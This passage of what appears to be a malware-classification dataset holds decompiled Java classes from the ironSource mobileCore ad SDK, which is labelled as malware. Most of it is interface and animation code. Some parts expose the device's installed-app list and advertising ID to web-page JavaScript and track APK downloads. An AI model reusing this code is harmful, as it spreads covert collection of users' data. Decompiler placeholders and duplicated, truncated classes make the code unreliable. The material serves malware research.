(!TextUtils.isEmpty(str3)) {       return str4 + ""?action="" + str3;     }     return str4;   } } private class b extends WebViewClient {   private b(){   }   b(  M m,  byte b){     this();   }   @Override public final boolean shouldOverrideUrlLoading(  WebView webView,  String str){     return false;   } } public class b extends Thread {   public b(){   }   @Override public final void run(){     super.run();     while (true) {       try {         a aVar=(a)MobileCoreReport.this.b.take();         MobileCoreReport.this.b();         aVar.a();         MobileCoreReport.this.a();         MobileCoreReport.b(MobileCoreReport.this);       }  catch (      InterruptedException e) {         return;       }     }   } } public interface b { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\c.code","public interface c {   String a(); } public interface c {   void a(  String str);   void a(  String str,  int i);   void a(  String str,  Exception exc);   void a(  String str,  boolean z);   void a(  JSONObject jSONObject) throws JSONException ;   void a(  JSONObject jSONObject,  String str,  boolean z); } private class c implements aF.a {   public c(){   }   public final void init(  String str,  String str2){     aL.this.a(""JSFlowBridge , init"",""flow:"" + str + "" , flowName:""+ str2);     aL.this.c=str2;     aL.this.b=str;   }   public final String getMobileParams(){     aL.this.a(""JSFlowBridge , getMobileParams"");     return aE.k(aL.this.a);   }   public final void cacheFeed(  String str){     aL.this.a(""JSFlowBridge , cacheFeed"");     C0114w.a().a(""offerwall-feed"",str);   }   public final void loadOfferwallUrl(  String str){     aL.a(aL.this,str);     aL.this.a(""JSFlowBridge , loadOfferwallUrl"",""check if already loading a url:"" + (!aL.this.j.b(str)) + "" , offerwallUrl:""+ str);   }   public final void show(){     aL.this.a(""JSFlowBridge , show"");     aL.this.f.b();   }   public final String getInstalledAppPackages(){     return aE.b();   }   public final double getScreenSize(){     return aE.e(MobileCore.c());   }   public final void openReport(  String str,  String str2){     aL.this.f.b(str,str2);   }   public final void setSharedPref(  String str,  String str2){     SharedPreferences.Editor edit=aE.d().edit();     edit.putString(str,str2);     edit.commit();   }   public final String getSharedPref(  String str,  String str2){     return aE.d().getString(str,str2);   }   public final void openReportOffers(  String str,  String str2){     try {       aE.a(MobileCore.c(),aL.this.b,aL.this.b,aJ.a.a(str),"""",aN.a(new JSONArray(str2)));     }  catch (    Exception e) {       e.printStackTrace();     }   } } private class c implements aF.a {   public c(){   }   public final void init(  String str,  String str2){     aQ.this.a(""JSFlowBridge , init"",""flow:"" + str + "" , flowName:""+ str2);     aQ.this.c=str2;     aQ.this.b=str;   }   public final void setMinTimeBetweenRefresh(  int i){     aQ.this.C=i;   }   public final String getMobileParams(){     aQ.this.a(""JSFlowBridge , getMobileParams"");     return aE.k(MobileCore.c());   }   public final void processFeed(  String str){     aQ.this.a(""JSFlowBridge , processFeed"");     C0114w.a().a(""slider-feed"",str);     try {       JSONObject jSONObject=new JSONObject(str);       C0114w.a().a(jSONObject,new f(jSONObject));     }  catch (    JSONException e) {       aE.a(MobileCore.c(),aQ.class.getName(),e);     }   }   public final String getInstalledAppPackages(){     return aE.b();   }   public final double getScreenSize(){     return aE.e(MobileCore.c());   }   public final void reportFeedRequestError(){   } } class c extends aE.e {   c(){   }   @Override public final void a(  boolean z){     aS.this.D=z;     aS.this.r();   } } public static abstract class c implements aF.a {   private aW a;   public void setWebViewWithLoadState(  aW aWVar){     this.a=aWVar;   }   public final void a(){     this.a.clearHistory();     if (this.a != null) {       this.a.a(a.READY);       A.a(""WebViewWithLoadState , id:"" + this.a.getId() + "" | set mState to ""+ this.a.c,55);     }   } } public final class C extends G implements V.b {   E.a a;   private ArrayList<O> b;   private boolean l;   private boolean m;   private boolean n;   private JSONObject o;   private int p;   private int q;   private JSONArray r;   private SparseArray<Boolean> s;   private K t;   private C0114w.a u;   private aM v;   private LinearLayout w;   private WebView x;   private N y;   private aQ z;   static void c(  C c){     if (c.y != null) {       AlphaAnimation alphaAnimation=new AlphaAnimation(1.0f,0.0f);       alphaAnimation.setInterpolator(new AccelerateInterpolator());       alphaAnimation.setDuration(500L);       alphaAnimation.setAnimationListener(new Animation.AnimationListener(){         @Override public final void onAnimationEnd(        Animation animation){           C.this.b(C.this.o);           C.this.o=null;           TranslateAnimation translateAnimation=new TranslateAnimation(C.this.p,0.0f,0.0f,0.0f);           translateAnimation.setDuration(500L);           translateAnimation.setFillAfter(true);           C.this.w.setAnimation(translateAnimation);           C.this.m();         }         @Override public final void onAnimationRepeat(        Animation animation){         }         @Override public final void onAnimationStart(        Animation animation){         }       } );       c.y.i().startAnimation(alphaAnimation);       c.m=true;     }   }   public C(  Context context,  C0091aw c0091aw){     super(context,c0091aw);     this.l=false;     this.m=false;     this.n=false;     this.b=new ArrayList<>();     this.s=new SparseArray<>();     this.p=aQ.h().m();     this.q=(int)(this.p * 0.9d);     this.x=new WebView(this.c);     aE.a(this.x,(WebChromeClient)null);     this.z=aQ.h();     this.u=new C0114w.a(){       @Override public final void a(      JSONObject jSONObject){         if (C.this.l) {           C.this.o=jSONObject;           if (C.this.y != null) {             C.c(C.this);             return;           }           return;         }         C.this.b(jSONObject);       }     } ;     this.z.a(this.u);     this.a=new E.a(){       private boolean b=false;       static boolean a(      AnonymousClass2 anonymousClass2,      boolean z){         anonymousClass2.b=false;         return false;       }       @Override public final synchronized void a(      JSONObject jSONObject){         if (!this.b) {           this.b=true;           C.this.z.a(C.this.e,jSONObject,new AbstractC0103l.d(){             @Override public final void a(){               AnonymousClass2.a(AnonymousClass2.this,false);             }           } );         }       }     } ;   }   @Override public final String a(){     return ""ironsourceInlineApps"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     A.a(""MCAppBanner | first build of buildFromJSON"",55);     super.a(jSONObject,true);     this.t.a(jSONObject);     b(false);     aQ aQVar=this.z;     JSONObject k=aQ.k();     if (k != null) {       b(k);       return;     }     if (aK.b(this.c)) {       this.y=new N(this.c,this.d,null);       View i=this.y.i();       ViewGroup.LayoutParams layoutParams=i.getLayoutParams();       layoutParams.width=this.p;       layoutParams.height=this.q / 2;       i.setLayoutParams(layoutParams);       this.w.addView(i);       this.w.invalidate();       JSONObject jSONObject2=new JSONObject();       this.y.a(jSONObject2);       this.y.b(jSONObject2);       this.y.a(true);       b(true);     }   }   private boolean f(){     return this.r != null && this.r.length() > 0;   }   private boolean g(){     for (int i=0; i < this.r.length(); i++) {       Boolean bool=this.s.get(i);       if (bool == null || !bool.booleanValue()) {         return false;       }     }     return true;   }   public void m(){     int a=this.v.a();     Boolean bool=this.s.get(a);     if ((f() && bool == null) || !bool.booleanValue()) {       A.a(""MCAppBanner | reporting offer"" + a,55);       if (a < this.r.length()) {         try {           final JSONObject jSONObject=this.r.getJSONObject(a);           aE.a(new AsyncTask<Void,Void,Void>(){             @Override protected final Void doInBackground(            Void[] voidArr){               aN.a(jSONObject);               return null;             }             @Override protected final void onPostExecute(            Void r7){               aE.a(MobileCore.c(),C.this.z.i(),C.this.z.j(),aJ.a.REPORT_ACTION_IMPRESSION,aN.c(jSONObject),(String)null);             }           } );           this.s.put(a,true);         }  catch (        JSONException e) {           e.printStackTrace();         }       }     }     if (g()) {       this.z.g();     }   }   @Override public final void a(  G.a aVar){     A.a(""MCAppBannerWidget | notifyVisibilityState() | old state "" + l().toString() + "" new state: ""+ aVar.toString(),55);     if (l() != aVar) { switch (aVar) { case VISIBLE:         this.l=true;       if (f()) {         if (!this.m && this.n) {           new CountDownTimer(1000L,10L){ {               super(1000L,10L);             }             @Override public final void onTick(            long j){               C.this.v.scrollTo((int)Math.ceil(((float)(C.this.q * j)) / 1000.0f),0);             }             @Override public final void onFinish(){               C.this.v.a(0);               C.this.m();             }           } .start();           this.m=true;           break;         }  else {           m();           break;         }       }     break; case HIDDEN:   this.l=false; if (this.o != null) {   b(this.o);   this.o=null;   break; }  else if (f()) {   this.v.a((this.v.a() + 1) % this.r.length());   break; } break; case SHOWING: if (f() && !this.m && !this.n) { this.v.scrollBy(this.q,0); this.n=true; break; } break; } super.a(aVar); } } public void b(JSONObject jSONObject){ boolean z; O o; if (this.y != null) { this.w.removeView(this.y.i()); this.y=null; } if (jSONObject != null && jSONObject.length() > 0) { this.r=jSONObject.optJSONArray(NativeAdResponse.KEY_ADS); this.s.clear(); if (f()) { z=true; for (int i=0; i < this.r.length(); i++) { JSONObject optJSONObject=this.r.optJSONObject(i); try { optJSONObject.put(""index"",i); }  catch (JSONException e) { } if (i < this.b.size()) { o=this.b.get(i); }  else { o=new O(this.c,this.d,this.a); this.b.add(i,o); View i2=o.i(); ViewGroup.LayoutParams layoutParams=i2.getLayoutParams(); layoutParams.width=this.q; layoutParams.height=this.q / 2; i2.setLayoutParams(layoutParams); this.w.addView(i2); this.w.invalidate(); } if (!o.g()) { try { o.a(optJSONObject); }  catch (JSONException e2) { b(false); } } boolean b=o.b(optJSONObject); o.a(b); z&=b; } int length=this.r.length(); while (true) { int i3=length; if (i3 >= this.b.size()) { break; } this.b.get(i3).a(false); length=i3 + 1; } if (this.m) { A.a(""APPBANNER: Scrolling to 0"",55); this.v.a(0); } }  else { z=true; } if (!z) { b(false); } b(true); return; } b(false); } @Override protected final boolean b(){ return false; } @Override protected final void c(){ this.h=new LinearLayout(this.c); ((LinearLayout)this.h).setOrientation(1); } @Override public final void d(){ this.t=new K(this.c,this.d); View i=this.t.i(); ViewGroup viewGroup=(ViewGroup)this.h; viewGroup.addView(i); this.v=new aM(this.c,null,this.q); this.v.setHorizontalScrollBarEnabled(false); this.v.a(new aM.a(){ @Override public final void a(int i2){ C.this.m(); } } ); this.w=new LinearLayout(this.c); this.w.setOrientation(0); this.v.addView(this.w); viewGroup.addView(this.v); } @Override public final void e(){ } private void b(boolean z){ this.t.a(z); a(z); } } !org.eclipse.jdt.core.dom.TypeDeclaration@5c66cd36private class c implements aF.a {   private boolean b=false;   static boolean a(  c cVar,  boolean z){     cVar.b=false;     return false;   }   public c(){   }   public final void init(  String str,  String str2){     C0107p.this.a(""JSFlowBridge , init"",""flow:"" + str + "" , flowName:""+ str2);     C0107p.this.c=str2;     C0107p.this.b=str;   }   public final String getMobileParams(){     C0107p.this.a(""JSFlowBridge , getMobileParams"");     return aE.k(MobileCore.c());   }   public final String getInstalledAppPackages(){     C0107p.this.a(""JSFlowBridge , getInstalledAppPackages"");     return aE.b();   }   public final void processFeed(  String str){     C0107p.this.a(""JSFlowBridge , processFeed"");     C0114w.a().a(""direct-feed"",str);     try {       C0107p.this.h=new JSONObject(str);       C0107p.this.i=C0107p.this.h.getJSONArray(NativeAdResponse.KEY_ADS);       C0107p.this.j.clear();       if (C0107p.this.f == a.STATE_INIT) {         C0107p.this.a(a.STATE_READY);         C0107p.e(C0107p.this);       }     }  catch (    JSONException e) {       aE.a(MobileCore.c(),C0107p.class.getName(),e);     }   }   public final void processNotAllowed(){     C0107p.this.a(""JSFlowBridge , processNotAllowed"");     C0107p.this.a(a.STATE_ERROR);   }   public final void show(){     int i;     JSONObject jSONObject;     int i2=0;     try {       if (!this.b) {         this.b=true;         while (true) {           i=i2;           if (i < C0107p.this.i.length()) {             Boolean bool=(Boolean)C0107p.this.j.get(i);             if (bool == null || !bool.booleanValue()) {               break;             }  else {               i2=i + 1;             }           }  else {             jSONObject=null;             break;           }         }         jSONObject=C0107p.this.i.getJSONObject(i);         jSONObject.put(""index"",i);         C0107p.this.j.put(i,true);         if (jSONObject == null) {           jSONObject=C0107p.this.i.getJSONObject(0);         }         if (C0107p.this.g != null) {           C0101j.a(C0107p.this.g);         }         C0107p.this.a(C0107p.this.g,jSONObject,new AbstractC0103l.d(){           @Override public final void a(){             c.a(c.this,false);           }         } );         C0107p.h(C0107p.this);       }     }  catch (    JSONException e) {       e.printStackTrace();     }   }   public final void reportFeedRequestError(){     if (C0107p.this.f == a.STATE_INIT) {       C0107p.this.a(a.STATE_ERROR);       C0107p.this.b(""reportFeedRequestError"",""Unspecified Error."");     }   }   public final void openReportOffers(  String str,  String str2){     try {       aE.a(MobileCore.c(),C0107p.this.b,C0107p.this.b,aJ.a.a(str),"""",aN.a(new JSONArray(str2)));     }  catch (    Exception e) {       e.printStackTrace();     }   } } public static class c implements aE.b {   protected String a;   protected String b;   protected aE.c c;   public c(  String str,  String str2,  aE.c cVar){     this.a=str2;     this.b=str;     this.c=cVar;   }   protected final File b(  HttpResponse httpResponse){     try {       InputStream content=httpResponse.getEntity().getContent();       Header firstHeader=httpResponse.getFirstHeader(""Content-Encoding"");       return a((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""gzip"")) ? content : new GZIPInputStream(content));     }  catch (    Exception e) {       if (this.c != null) {         this.c.a(this.a,e);       }       return null;     }   }   private File a(  InputStream inputStream){     if (this.c != null) {       this.c.a(this.a);     }     File file=null;     try {       file=aE.a(inputStream,this.b,this.a);     }  catch (    IOException e) {       if (this.c != null) {         this.c.a(this.a,e);       }     }     if (this.c != null) {       aE.c cVar=this.c;       String str=this.a;     }     return file;   }   @Override public boolean a(  HttpResponse httpResponse){     File b=b(httpResponse);     if (this.c != null) {       this.c.a(this.a,b != null);     }     return b != null;   }   @Override public final void a(  int i){     if (this.c != null) {       this.c.a(this.a,i);     }   }   @Override public final void a(  Exception exc){     if (this.c != null) {       this.c.a(this.a,exc);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0026a.code","private static class C0026a implements InterfaceC0093b {   private IBinder a;   C0026a(  IBinder iBinder){     this.a=iBinder;   }   @Override public final IBinder asBinder(){     return this.a;   }   @Override public final String a() throws RemoteException {     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");       this.a.transact(1,obtain,obtain2,0);       obtain2.readException();       return obtain2.readString();     }   finally {       obtain2.recycle();       obtain.recycle();     }   }   @Override public final boolean a(  boolean z) throws RemoteException {     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");       obtain.writeInt(z ? 1 : 0);       this.a.transact(2,obtain,obtain2,0);       obtain2.readException();       return obtain2.readInt() != 0;     }   finally {       obtain2.recycle();       obtain.recycle();     }   }   @Override public final String a(  String str) throws RemoteException {     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");       obtain.writeString(str);       this.a.transact(3,obtain,obtain2,0);       obtain2.readException();       return obtain2.readString();     }   finally {       obtain2.recycle();       obtain.recycle();     }   }   @Override public final void a(  String str,  boolean z) throws RemoteException {     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");       obtain.writeString(str);       obtain.writeInt(z ? 1 : 0);       this.a.transact(4,obtain,obtain2,0);       obtain2.readException();     }   finally {       obtain2.recycle();       obtain.recycle();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0068a.code","final class C0068a {   public static void a(  Context context,  String str,  int i){     SharedPreferences n=aE.n(context);     if (i != 1 && i != 2 && i != -1 && i != 0) {       try {         throw new Exception(""Invalid status in Download | setDownloadStatus"");       }  catch (      Exception e) {         e.printStackTrace();         return;       }     }     n.edit().putInt(""apkDownloadFile_"" + str,i).commit();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0069aa.code","public final class C0069aa extends AbstractC0089au {   public C0069aa(  Activity activity,  int i){     super(activity,i);   }   @Override public final void a(  boolean z){     a(-this.A,0,z);   }   @Override public final void b(  boolean z){     a(0,0,z);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{-16777216,0});     invalidate();   }   @Override protected final void onLayout(  boolean z,  int i,  int i2,  int i3,  int i4){     int i5=i3 - i;     int i6=i4 - i2;     int i7=(int)this.d;     this.y.layout(0,i6 - this.A,i5,i6);     f(i7);     if (p) {       this.z.layout(0,0,i5,i6);     }  else {       this.z.layout(0,i7,i5,i6 + i7);     }   }   private void f(  int i){     if (this.n && this.A != 0) {       int height=getHeight();       int i2=this.A;       float f=(i2 + i) / i2;       if (p) {         if (i != 0) {           this.y.setTranslationY((int)(i2 * f * 0.25f));           return;         }  else {           this.y.setTranslationY(height + i2);           return;         }       }       this.y.offsetTopAndBottom(((height - this.A) + ((int)((i2 * f) * 0.25f))) - this.y.getTop());       this.y.setVisibility(i == 0 ? 4 : 0);     }   }   @Override protected final void a(  Canvas canvas,  int i){     int width=getWidth();     int height=getHeight();     this.s.setBounds(0,height + i,width,height + i + this.t);     this.s.draw(canvas);   }   @Override protected final void b(  Canvas canvas,  int i){     int width=getWidth();     int height=getHeight();     this.q.setBounds(0,height + i,width,height);     this.q.setAlpha((int)(185.0f * (1.0f - (Math.abs(i) / this.A))));     this.q.draw(canvas);   }   @Override protected final void c(  Canvas canvas,  int i){   }   @Override protected final void a(){     this.k.a(0,0,(-this.A) / 3,0,1000);   }   @Override protected final void b(  int i){     if (p) {       this.z.setTranslationY(i);       f(i);       invalidate();     }  else {       this.z.offsetTopAndBottom(i - this.z.getTop());       f(i);       invalidate();     }   }   @Override protected final boolean a(  MotionEvent motionEvent){     return motionEvent.getY() < ((float)getHeight()) + this.d;   }   @Override protected final boolean b(){     int height=getHeight();     return (!this.C && this.g >= ((float)(height - this.F))) || (this.C && this.g <= ((float)height) + this.d);   }   @Override protected final boolean a(  float f){     int height=getHeight();     return (!this.C && this.g >= ((float)(height - this.F)) && f < 0.0f) || (this.C && this.g <= ((float)height) + this.d);   }   @Override protected final void b(  float f){     c(Math.max(Math.min(this.d + f,0.0f),-this.A));   }   @Override protected final void b(  MotionEvent motionEvent){     int i=(int)this.d;     if (this.e) {       this.l.computeCurrentVelocity(1000,this.m);       int xVelocity=(int)this.l.getXVelocity();       this.i=motionEvent.getY();       a(this.l.getYVelocity() < 0.0f ? -this.A : 0,xVelocity,true);       return;     }     if (this.C && motionEvent.getY() < i + getHeight()) {       b(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0070ab.code","final class C0070ab extends AbstractC0086ar {   C0070ab(  Activity activity,  int i){     super(activity,i,EnumC0080al.BOTTOM);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{-16777216,0});     invalidate();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0071ac.code","public class C0071ac extends FrameLayout {   private boolean a;   private boolean b;   private boolean c;   private boolean d;   static boolean a(  C0071ac c0071ac,  boolean z){     c0071ac.a=true;     return true;   }   static boolean b(  C0071ac c0071ac,  boolean z){     c0071ac.d=false;     return false;   }   public C0071ac(  Context context){     super(context);     this.b=true;     this.d=true;     if (AbstractC0077ai.p) {       setLayerType(2,null);     }   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     this.c=true;   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     this.c=false;   }   @Override protected void onSizeChanged(  int i,  int i2,  int i3,  int i4){     super.onSizeChanged(i,i2,i3,i4);     if (AbstractC0077ai.p && this.b) {       post(new Runnable(){         @Override public final void run(){           C0071ac.a(C0071ac.this,true);           C0071ac.this.invalidate();         }       } );     }   }   @Override protected void dispatchDraw(  Canvas canvas){     super.dispatchDraw(canvas);     if (this.a && AbstractC0077ai.p) {       post(new Runnable(){         @Override public final void run(){           if (C0071ac.this.c) {             if (C0071ac.this.getLayerType() != 2 || C0071ac.this.d) {               C0071ac.b(C0071ac.this,false);               C0071ac.this.setLayerType(2,null);               C0071ac.this.buildLayer();               C0071ac.this.setLayerType(0,null);             }           }         }       } );       this.a=false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0072ad.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5f0a6c64"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0075ag.code","public final class C0075ag extends AbstractC0074af {   public C0075ag(  Activity activity,  int i){     super(activity,i);   }   @Override public final void a(  boolean z){     a(this.A,0,z);   }   @Override public final void b(  boolean z){     a(0,0,z);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,new int[]{-16777216,0});     invalidate();   }   @Override protected final void onLayout(  boolean z,  int i,  int i2,  int i3,  int i4){     int i5=i3 - i;     int i6=i4 - i2;     int i7=(int)this.d;     this.y.layout(0,0,this.A,i6);     f(i7);     if (p) {       this.z.layout(0,0,i5,i6);     }  else {       this.z.layout(i7,0,i5 + i7,i6);     }   }   private void f(  int i){     if (this.n && this.A != 0) {       int i2=this.A;       float f=(i2 - i) / i2;       if (p) {         if (i > 0) {           this.y.setTranslationX((int)(i2 * (-f) * 0.25f));           return;         }  else {           this.y.setTranslationX(-i2);           return;         }       }       this.y.offsetLeftAndRight(((int)((i2 * (-f)) * 0.25f)) - this.y.getLeft());       this.y.setVisibility(i == 0 ? 4 : 0);     }   }   @Override protected final void a(  Canvas canvas,  int i){     this.s.setBounds(i - this.t,0,i,getHeight());     this.s.draw(canvas);   }   @Override protected final void b(  Canvas canvas,  int i){     this.q.setBounds(0,0,i,getHeight());     this.q.setAlpha((int)((1.0f - (i / this.A)) * 185.0f));     this.q.draw(canvas);   }   @Override protected final void c(  Canvas canvas,  int i){   }   @Override protected final void a(){     int i=this.A / 3;     this.k.b(i,0,-i,0,1000);   }   @Override protected final void b(  int i){     if (p) {       this.z.setTranslationX(i);       f(i);       invalidate();     }  else {       this.z.offsetLeftAndRight(i - this.z.getLeft());       f(i);       invalidate();     }   }   @Override protected final boolean a(  MotionEvent motionEvent){     return motionEvent.getX() > this.d;   }   @Override protected final boolean b(){     return (!this.C && this.f <= ((float)this.F)) || (this.C && this.f >= this.d);   }   @Override protected final boolean a(  float f){     return (!this.C && this.f <= ((float)this.F) && f > 0.0f) || (this.C && this.f >= this.d);   }   @Override protected final void b(  float f){     c(Math.min(Math.max(this.d + f,0.0f),this.A));   }   @Override protected final void b(  MotionEvent motionEvent){     int i=(int)this.d;     if (this.e) {       this.l.computeCurrentVelocity(1000,this.m);       int xVelocity=(int)this.l.getXVelocity();       this.h=motionEvent.getX();       a(this.l.getXVelocity() > 0.0f ? this.A : 0,xVelocity,true);       return;     }     if (this.C && motionEvent.getX() > i) {       b(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0076ah.code","final class C0076ah extends AbstractC0086ar {   C0076ah(  Activity activity,  int i){     super(activity,i,EnumC0080al.LEFT);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,new int[]{-16777216,0});     invalidate();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0078aj.code","public final class C0078aj extends C0071ac {   public C0078aj(  Context context){     super(context);   }   @Override public final boolean onTouchEvent(  MotionEvent motionEvent){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0081am.code","public final class C0081am extends AbstractC0074af {   public C0081am(  Activity activity,  int i){     super(activity,i);   }   @Override public final void a(  boolean z){     a(-this.A,0,z);   }   @Override public final void b(  boolean z){     a(0,0,z);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,new int[]{-16777216,0});     invalidate();   }   @Override protected final void onLayout(  boolean z,  int i,  int i2,  int i3,  int i4){     int i5=i3 - i;     int i6=i4 - i2;     int i7=(int)this.d;     this.y.layout(i5 - this.A,0,i5,i6);     f(i7);     if (p) {       this.z.layout(0,0,i5,i6);     }  else {       this.z.layout(i7,0,i5 + i7,i6);     }   }   private void f(  int i){     if (this.n && this.A != 0) {       int i2=this.A;       float f=(i2 + i) / i2;       if (p) {         if (i != 0) {           this.y.setTranslationX((int)(i2 * f * 0.25f));           return;         }  else {           this.y.setTranslationX(-i2);           return;         }       }       this.y.offsetLeftAndRight((((int)((i2 * f) * 0.25f)) + getWidth()) - this.y.getRight());       this.y.setVisibility(i == 0 ? 4 : 0);     }   }   @Override protected final void a(  Canvas canvas,  int i){     int height=getHeight();     int width=getWidth() + i;     this.s.setBounds(width,0,this.t + width,height);     this.s.draw(canvas);   }   @Override protected final void b(  Canvas canvas,  int i){     int height=getHeight();     int width=getWidth();     this.q.setBounds(width + i,0,width,height);     this.q.setAlpha((int)(185.0f * (1.0f - (Math.abs(i) / this.A))));     this.q.draw(canvas);   }   @Override protected final void c(  Canvas canvas,  int i){     if (this.v != null && this.v.getParent() != null && this.w == 0) {       int width=getWidth();       int i2=this.A;       int i3=width + i;       this.v.getDrawingRect(this.x);       offsetDescendantRectToMyCoords(this.v,this.x);       int interpolation=((int)((1.0f - a.getInterpolation(1.0f - (Math.abs(i) / i2))) * this.u.getWidth())) + i3;       int height=this.x.top + ((this.x.height() - this.u.getHeight()) / 2);       canvas.save();       canvas.clipRect(i3,0,interpolation,getHeight());       canvas.drawBitmap(this.u,interpolation - r2,height,(Paint)null);       canvas.restore();     }   }   @Override protected final void a(){     this.k.a(0,0,(-this.A) / 3,0,1000);   }   @Override protected final void b(  int i){     if (p) {       this.z.setTranslationX(i);       f(i);       invalidate();     }  else {       this.z.offsetLeftAndRight(i - this.z.getLeft());       f(i);       invalidate();     }   }   @Override protected final boolean a(  MotionEvent motionEvent){     return motionEvent.getX() < ((float)getWidth()) + this.d;   }   @Override protected final boolean b(){     int width=getWidth();     int i=(int)this.f;     return (!this.C && i >= width - this.F) || (this.C && ((float)i) <= ((float)width) + this.d);   }   @Override protected final boolean a(  float f){     int width=getWidth();     int i=(int)this.f;     return (!this.C && i >= width - this.F && f < 0.0f) || (this.C && ((float)i) <= ((float)width) + this.d);   }   @Override protected final void b(  float f){     c(Math.max(Math.min(this.d + f,0.0f),-this.A));   }   @Override protected final void b(  MotionEvent motionEvent){     int i=(int)this.d;     int width=getWidth();     if (this.e) {       this.l.computeCurrentVelocity(1000,this.m);       int xVelocity=(int)this.l.getXVelocity();       this.h=motionEvent.getX();       a(this.l.getXVelocity() > 0.0f ? 0 : -this.A,xVelocity,true);       return;     }     if (this.C && motionEvent.getX() < i + width) {       b(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0082an.code","final class C0082an extends AbstractC0086ar {   C0082an(  Activity activity,  int i){     super(activity,i,EnumC0080al.RIGHT);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,new int[]{-16777216,0});     invalidate();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0083ao.code","final class C0083ao {   private static final float t=(float)(Math.log(0.75d) / Math.log(0.9d));   private static final float[] u=new float[101];   private static float x;   private static float y;   private int a;   private int b;   private int c;   private int d;   private int e;   private int f;   private int g;   private int h;   private int i;   private int j;   private int k;   private long l;   private int m;   private float n;   private float o;   private float p;   private boolean q;   private Interpolator r;   private boolean s;   private float v;   private final float w; static {     float f;     float f2;     float f3=0.0f;     int i=0;     while (i <= 100) {       float f4=i / 100.0f;       float f5=1.0f;       float f6=f3;       while (true) {         f=((f5 - f6) / 2.0f) + f6;         f2=3.0f * f * (1.0f - f);         float f7=((((1.0f - f) * 0.4f) + (0.6f * f)) * f2) + (f * f * f);         if (Math.abs(f7 - f4) >= 1.0E-5d) {           if (f7 > f4) {             f5=f;           }  else {             f6=f;           }         }       }       u[i]=(f * f * f) + f2;       i++;       f3=f6;     }     u[100]=1.0f;     x=8.0f;     y=1.0f;     y=1.0f / a(1.0f);   }   public C0083ao(  Context context,  Interpolator interpolator){     this(context,interpolator,context.getApplicationInfo().targetSdkVersion >= 11);   }   private C0083ao(  Context context,  Interpolator interpolator,  boolean z){     this.q=true;     this.r=interpolator;     this.w=context.getResources().getDisplayMetrics().density * 160.0f;     this.v=ViewConfiguration.getScrollFriction() * 386.0878f * this.w;     this.s=z;   }   public final boolean a(){     return this.q;   }   public final int b(){     return this.j;   }   public final int c(){     return this.d;   }   public final boolean d(){     float interpolation;     if (this.q) {       return false;     }     int currentAnimationTimeMillis=(int)(AnimationUtils.currentAnimationTimeMillis() - this.l);     if (currentAnimationTimeMillis < this.m) { switch (this.a) { case 0:         float f=currentAnimationTimeMillis * this.n;       if (this.r == null) {         interpolation=a(f);       }  else {         interpolation=this.r.getInterpolation(f);       }     this.j=this.b + Math.round(this.o * interpolation);   this.k=Math.round(interpolation * this.p) + this.c; break; case 1: float f2=currentAnimationTimeMillis / this.m; int i=(int)(100.0f * f2); float f3=i / 100.0f; float f4=u[i]; float f5=(((f2 - f3) / (((i + 1) / 100.0f) - f3)) * (u[i + 1] - f4)) + f4; this.j=this.b + Math.round((this.d - this.b) * f5); this.j=Math.min(this.j,this.g); this.j=Math.max(this.j,this.f); this.k=Math.round(f5 * (this.e 